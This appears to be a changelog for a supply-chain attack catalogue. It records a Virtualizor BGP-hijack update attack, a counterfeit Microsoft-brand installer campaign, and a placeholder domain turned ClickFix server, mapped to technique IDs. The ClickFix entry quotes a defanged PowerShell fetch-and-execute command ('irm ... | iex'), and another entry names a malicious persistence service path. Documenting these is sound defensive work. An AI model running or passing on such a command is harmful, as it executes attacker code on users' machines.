Virtualizor BGP-hijack update attack and Microsoft counterfeit installers added (AS291, AS292)

  • AS291 Virtualizor/Softaculous BGP hijack (BleepingComputer, 28–30 Aug; Softaculous advisory): a BGP route hijack of a Hetzner IP block rerouted Virtualizor update/billing requests to attacker servers, delivering a malicious update package with persistence at /etc/systemd/system/java-jre-update.service; Softaculous now signs all packages. Platforms linux/windows; new technique T0212 (Subvert network routing to intercept update traffic) added with technique-origin entry, plus T0180/T0121 for the supply-chain stage and T0159/T0148/T0184 on the host.
  • AS292 Microsoft counterfeit-installer campaign (Microsoft Defender Experts, 1 Sep): vendor-look-alike download sites (.com.cn/.hl.cn, Razer/Edge/Kaspersky/Baidu et al., moderate-confidence Silver Fox/Yinhu) deliver installer archives whose families (app_setup.*, zinst.*, zintall.*, intsoft.*, innstll.*) keep the same filename while contents regenerate server-side per download, defeating URL/hash reputation; randomized-path stage-one with stable hash, fabricated version metadata with unfilled TODO placeholder, repurposed TrueUpdate runtime fetching from Alibaba Cloud OSS. Platforms windows/cdn; T0136/T0110/T0207 for the distribution stage, T0159/T0148/T0176/T0184 on the victim machine. Server-side regeneration recorded as a gap, not force-mapped.
  • Re-walked every track:true source. Everything else this window was already mapped (Aikido Shai-Hulud 111-day reactivation and Clean-Release resurfaces on AS48/AS16, OX PhantomSub Baileys spam-subscribe on AS85, ReversingLabs OpenAI/HF mob-agent postmortem on AS16/TanStack + AS26/PhantomRaven references, StepSecurity sckit/MemTensor on AS39, CloudSEK BRIDGEHEAD/TXTBOOK/LiteLLM on AS114/AS115/AS17, Wiz Artifactory on AS190, Aikido Graphalgo on AS40, Aikido XCSSET Flutter on AS116, Socket PolinRider Packagist on AS35, Morphisec polymorphic/fortibleed essays and product posts, GitHub changelog platform security defaults, CISA advisories, RubyGems/Rust blog items) or is defensive research, show episodes, and advisory items, already classified.

Placeholder domain third-party.com turned live ClickFix server (AS289)

  • New AS289 (Manifold Security): third-party[.]com — a documentation placeholder in 1,500+ files across 1,700+ repositories (Chromium docs, Sanity/Vercel skills, MCP-server docs) — is not IANA-reserved and was registered by someone else. Since at least June 2026 it has served a Windows-gated ClickFix lure (fake Cloudflare check, clipboard poisoning, Win+R → PowerShell irm elxxvvx[.]xyz/f | iex). macOS/Linux crawlers get a benign decoy, so reputation feeds and static checks see nothing; IPFire listed and de-listed it in July for exactly that reason. Platforms: cdn, ai-agents, windows.
  • Follow-up (24 Sep, same team) attached: 350,000+ GitHub files cite placeholder domains serving scams — parking pages your-domain[.]com / yoursite[.]com served macOS scareware and counterfeit BBC/ZDF investment-fraud pages in 2 of 16 macOS renders; every static check cleared them.
